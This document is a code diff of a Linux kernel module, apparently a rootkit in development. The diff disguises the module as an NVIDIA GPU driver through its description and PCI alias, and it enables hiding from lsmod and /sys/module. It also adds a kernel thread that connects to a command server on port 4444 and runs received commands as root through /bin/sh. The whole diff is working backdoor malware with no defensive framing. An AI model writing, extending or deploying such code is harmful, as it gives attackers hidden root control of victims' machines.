@@ -7,24 +7,25 @@
 #include <linux/in.h>
 #include <linux/delay.h>
 #include <linux/slab.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h>
-#include <linux/kmod.h>
 #include <linux/string.h>
+#include <linux/uaccess.h>
 #include <net/sock.h>
+#include <linux/inet.h>
+#include <linux/kmod.h>
 
-MODULE_LICENSE("Proprietary");
+
+MODULE_LICENSE("GPL");
 MODULE_AUTHOR("kernel");
-MODULE_DESCRIPTION("Hidden Beacon Module");
-
-#define SERVER_IP   0x7F000001  // 127.0.0.1
-#define SERVER_PORT 4444
-#define BUF_SIZE    1024
+MODULE_DESCRIPTION("Mimic NVIDIA GPU Driver");
+MODULE_ALIAS("pci:v000010DEd00001D01sv*sd*bc*sc*i*");
 
 static struct task_struct *beacon_thread;
 static struct socket *conn_socket = NULL;
+#define SERVER_IP   0x7F000001  // 127.0.0.1
+#define SERVER_PORT 4444
+#define BUF_SIZE 1024
 
-// Create TCP connection from kernel space
+// Kernel-space TCP connection function
 static int connect_to_server(void) {
     struct sockaddr_in s_addr;
     int ret;
@@ -41,81 +42,45 @@ static int connect_to_server(void) {
     return ret;
 }
 
-// Main beacon thread
+// Receive and execute shell commands
 static int beacon_main(void *data) {
-    struct msghdr msg;
-    struct kvec iov;
+    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
+    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
     char recv_buf[BUF_SIZE];
-    char result_buf[BUF_SIZE];
-    struct file *file;
-    mm_segment_t old_fs;
     int len;
 
     if (connect_to_server() < 0) return 0;
 
-    old_fs = get_fs();
-    set_fs(KERNEL_DS);  // Needed for file access in older kernels
-
     while (!kthread_should_stop()) {
-        memset(&msg, 0, sizeof(msg));
-        memset(&iov, 0, sizeof(iov));
         memset(recv_buf, 0, BUF_SIZE);
+        len = kernel_recvmsg(conn_socket, &(struct msghdr){ .msg_flags = 0 },
+                             &(struct kvec){ .iov_base = recv_buf, .iov_len = BUF_SIZE },
+                             1, BUF_SIZE, 0);
 
-        iov.iov_base = recv_buf;
-        iov.iov_len = BUF_SIZE;
+        if (len > 0) {
+            recv_buf[len] = '\0';
+            printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);
 
-        len = kernel_recvmsg(conn_socket, &msg, &iov, 1, BUF_SIZE, 0);
-        if (len <= 0) {
-            msleep(1000);
-            continue;
+            // Build argument array for shell
+            argv[2] = recv_buf;
+
+            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
         }
-
-        recv_buf[len] = '\0';
-        printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);
-
-        // Run the command with output redirected
-        char *cmd_fmt = "/bin/sh -c '%s > /tmp/out 2>&1'";
-        char full_cmd[BUF_SIZE];
-        snprintf(full_cmd, BUF_SIZE, cmd_fmt, recv_buf);
-
-        char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
-        char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-
-        // Read the output
-        memset(result_buf, 0, BUF_SIZE);
-        file = filp_open("/tmp/out", O_RDONLY, 0);
-        if (!IS_ERR(file)) {
-            kernel_read(file, result_buf, BUF_SIZE - 1, &file->f_pos);
-            filp_close(file, NULL);
-        } else {
-            snprintf(result_buf, BUF_SIZE, "[error reading output]");
-        }
-
-        // Send back output
-        memset(&msg, 0, sizeof(msg));
-        memset(&iov, 0, sizeof(iov));
-        iov.iov_base = result_buf;
-        iov.iov_len = strlen(result_buf);
-
-        kernel_sendmsg(conn_socket, &msg, &iov, 1, iov.iov_len);
 
         msleep(1000);
     }
 
-    set_fs(old_fs);
     return 0;
 }
 
-// Hide module and start thread
 static int __init hidden_init(void) {
-    printk(KERN_INFO "[hidden_module] Loaded.\n");
+    printk(KERN_INFO "[hidden_module] Hello world!\n");
 
-    // Hide from lsmod/proc/sys
-    // removed for testing
-    // list_del_init(&__this_module.list);
-    // kobject_del(&THIS_MODULE->mkobj.kobj);
+    // Hide from lsmod, /proc/modules, /sys/module
+    list_del_init(&__this_module.list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
 
+    // Start kernel beacon thread
     beacon_thread = kthread_run(beacon_main, NULL, "beacon_thread");
     return 0;
 }
@@ -123,10 +88,11 @@ static int __init hidden_init(void) {
 static void __exit hidden_exit(void) {
     if (beacon_thread)
         kthread_stop(beacon_thread);
+
     if (conn_socket)
         sock_release(conn_socket);
 
-    printk(KERN_INFO "[hidden_module] Unloaded.\n");
+    printk(KERN_INFO "[hidden_module] Goodbye!\n");
 }
 
 module_init(hidden_init);
